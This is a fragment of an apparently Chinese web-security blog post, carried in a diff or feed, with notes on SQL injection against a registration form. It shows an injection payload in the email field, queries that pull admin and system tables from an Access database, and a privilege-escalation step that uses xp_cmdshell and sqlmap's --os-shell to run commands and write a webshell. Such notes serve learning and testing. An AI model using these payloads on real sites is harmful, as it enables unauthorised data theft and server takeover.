+username=test&amp;email=t@t.com&amp;password=123&amp;password2=123&amp;submit=Register  
+username=test&amp;email=t@t.com&#39; and &#39;1&#39; = &#39;1&amp;password=123&amp;password2=123&amp;submit=Register  
+</code></pre><h4 id="02-SQL注入流程"><a href="#02-SQL注入流程" class="headerlink" title="02 SQL注入流程"></a>02 SQL注入流程</h4><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png" alt=""></p>
+<p>数据获取</p>
+<pre><code>web.mdb
+
+select [*] from admin
+select [*] from system
+
+select [username] from system
+select [name] from system
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png" alt=""></p>
+<p>提权</p>
+<pre><code>xp.cmdshell
+
+--os-shell // 执行系统命令 写webshell到网站目录
+</code></pre>]]></content>
       <categories>
         <category>web安全</category>
       </categories>
